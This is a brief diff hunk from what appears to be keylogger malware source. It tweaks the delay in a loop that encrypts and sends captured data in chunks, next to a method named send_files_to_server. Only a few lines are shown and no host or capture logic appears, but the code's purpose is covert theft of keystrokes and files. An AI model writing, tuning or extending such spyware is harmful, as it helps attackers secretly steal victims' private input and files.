@@ -156,7 +156,7 @@ class Keylogger:
         
         for chunk in chunks:
             self.encrypt_and_send(chunk)
-            time.sleep(0.001)
+            time.sleep(0.005)
             
     def send_files_to_server(self, files: list):
         chunk_size = utils.BUFFSIZE-96
